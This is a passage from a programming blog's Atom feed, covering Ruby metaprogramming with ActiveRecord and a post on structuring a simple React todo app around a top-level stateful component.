&lt;script src=&quot;https://gist.github.com/toaderflorin/aadbf0fcc2ad54841d5d84e7dff23eeb.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;If you are coming from C++, you might see the benefit in this particular example but might be scratching your head and wondering why is this desirable, because after all Ruby could have included a simplified way of accessing properties directly in its syntax. Well, the answer is Ruby prides itself on being a very expressive language and being conducive to developer happiness and what metaprogramming allows is a lot of functionality to be added on the fly depending on the state of specific objects. This reflects in the user friendliness of the libraries people write and one example of this would be ActiveRecord where a lot of functionality is generated on the fly.&lt;/p&gt;

&lt;p&gt;Here’s an example straight from the AR docs. For the following table:&lt;/p&gt;

&lt;pre&gt;
CREATE TABLE products (
   id int(11) NOT NULL auto_increment,
   name varchar(255),
   PRIMARY KEY  (id)
);
&lt;/pre&gt;

&lt;p&gt;you can very easily access it like so:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/39614ab27c80ff5bdb3f8f9c335ec7d6.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;It’s definitely a lot less verbose than if you would have written something similar in Java/C#, because the library takes care of a lot of magic for us. Ruby might seem like the perfect programming language but all this dynamism comes at a significant performance cost: Ruby (at least when using MRI) is two orders of magnitude slower than Node or Go.&lt;/p&gt;</content><author><name></name></author><summary type="html">First things first: Ruby is a dynamic language but it’s not dynamic in the same way Javascript is a dynamic language. You actually have real classes and class inheritance and not just prototypical inheritance. Also Ruby is truly object oriented—everything is an object, even classes, and there is no such thing as a distinction between value and reference types. In this article we will be looking at MRI (Matz’s Ruby Implementation) which is written in C to see how everything works behind the scenes. At MRI’s core there are two structures that describe the current list of objects in memory: RObject and RClass. The C code is a little bit complicated so I will present a simplified schematic version, which will allow you to understand the implementation.</summary></entry><entry><title type="html">Simple Component Based Architecture With React</title><link href="http://localhost:4000/component-architecture" rel="alternate" type="text/html" title="Simple Component Based Architecture With React" /><published>2017-08-22T06:39:37+03:00</published><updated>2017-08-22T06:39:37+03:00</updated><id>http://localhost:4000/component-architecture</id><content type="html" xml:base="http://localhost:4000/component-architecture">&lt;p&gt;I normally wouldn’t have wrote this article as I find what I am about to present quite straightforward, but I’ve heard this sentence (or something along those lines) multiple times: &lt;em&gt;Let’s not use React because it would be an overkill for our application. We would have to use Flux / Redux and it’s too much for what we need.&lt;/em&gt; No, you don’t,  and this is important: React is just a view layer. Flux is an architectural pattern, but it doesn’t mean you have to use it if you are using React and you can also use Flux even if you are using another library—in fact it’s quite popular to use Flux with Angular. React (just like Angular 2+) is built around components, and building a web application out of components is perfectly feasible, as I will show.&lt;/p&gt;

&lt;p&gt;Our goal for this demo app is to avoid using a separate store to keep the application architecture simple, but at the same time we want to avoid things like partial page updates or a lot of stateful event based interactions which lead to spaghetti like dependencies in our code. Here’s an example of interaction I’ve unfortunately encountered all too often in UI code:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;The user changes a text input field which triggers a handler. That handler does some processing and does some partial updates in some other part of the UI which in turn triggers another set of events, which trigger more processing and more UI updating etc.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/big-ball.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can quickly see that this kind of approach becomes unwieldy quite fast, so we are going to do two things to mitigate this:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;We will keep the whole application state as the state of the top level &lt;em&gt;App&lt;/em&gt; component.&lt;/li&gt;
  &lt;li&gt;We are going to use a &lt;em&gt;top-down&lt;/em&gt; approach, were the top level component acts as a sort of manager and coordinates what’s happening.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Because components naturally form a hierarchy, we can use that hierarchy to act like sort of a &lt;em&gt;chain of command&lt;/em&gt;. What we are trying to avoid here is components talking &lt;em&gt;directly to one another&lt;/em&gt;, because that would mean NxN complexity and partial page updates. What they should do instead is they should communicate through their superior — that would mean receiving commands (like display this data) and sending notifications up the hierarchy (action X has been performed by the user like submitting a form, for example).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/dilbert.jpg&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So no component should tell other component (on the same hierarchical level) it’s a piece of garbage &lt;em&gt;directly&lt;/em&gt;. But it’s OK if a component “higher in command” does it.&lt;/p&gt;

&lt;h2 id=&quot;the-application&quot;&gt;The Application&lt;/h2&gt;

&lt;p&gt;We are going to build an application that allows a user to manage a list of todos. For the sake of simplicity, we are going to have a backend that globally manages a collection of tasks, so we don’t support multiple users. The application is meant to be run locally and we will demonstrate how to structure it with components. Here’s a sketch of what we want our application to look like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/sketch.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The dotted lines indicate how we want to split our application into smaller pieces—the components that are going to make up the application. This means we get this hierarchy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/hierarchy.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Codewise, this is what the top level component looks like:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/f16af2f7d587cd628e45543b34c0b446.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;As you can see, it contains the methods for adding and removing todos. These are passed down as props to the &lt;em&gt;AddTask&lt;/em&gt; and &lt;em&gt;TaskList&lt;/em&gt; components respectively.&lt;/p&gt;

&lt;p&gt;Here is the &lt;em&gt;AddTask&lt;/em&gt; component:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/acf3aa438d747ff6fde2250ba976a897.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; You might have been worried about sending all that information up the chain of command. Turns out that we don’t need to notify the &lt;em&gt;App&lt;/em&gt; component for every keystroke that changes the input field, no need to bother the boss with irrelevant information every half a second or so. That’s why this component is going to have &lt;em&gt;some private state&lt;/em&gt; of its own. Since we have to track the value of the input field component and we will be reacting on the &lt;em&gt;onChanged&lt;/em&gt; event of the input in order to keep the state and the input value in sync. We also won’t be able to use a functional (stateless) component here because of this.&lt;/p&gt;

&lt;p&gt;And last but not least, the list of tasks:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/70e6cbc872f55cf9cfe3fdf546fb1178.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;and…&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/6ab7f1bbf8faa03609b7df11332a83be.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;It is desirable to use functional components whenever possible. Not only are they easier to write and the code is more succinct, but the fact that don’t handle their own state is also advantageous. The &lt;em&gt;TaskList&lt;/em&gt; component just passes the &lt;em&gt;deleteTaskClick&lt;/em&gt; handler through to the &lt;em&gt;Task&lt;/em&gt; component. We are using a similar bind approach here, as we did for &lt;em&gt;AddTask&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The code was slightly tweaked and simplified for legibility, download the full version &lt;a href=&quot;https://github.com/toaderflorin/florintoader&quot;&gt;here&lt;/a&gt;. And of course, this is a very simple application — if you are using a component based approach, you will probably have multiple “levels of command” in the component hierarchy, similar to what you would have in a big organization. You need to use your judgement in designing the application state, splitting it into components, assigning responsibilities to each and splitting the state accordingly. You might however reach the conclusion that it’s worth using Redux / Flux as the application gets larger.&lt;/p&gt;</content><author><name></name></author><summary type="html">I normally wouldn’t have wrote this article as I find what I am about to present quite straightforward, but I’ve heard this sentence (or something along those lines) multiple times: Let’s not use React because it would be an overkill for our application. We would have to use Flux / Redux and it’s too much for what we need. No, you don’t, and this is important: React is just a view layer. Flux is an architectural pattern, but it doesn’t mean you have to use it if you are using React and you can also use Flux even if you are using another library—in fact it’s quite popular to use Flux with Angular. React (just like Angular 2+) is built around components, and building a web application out of components is perfectly feasible, as I will show.</summary></entry></feed>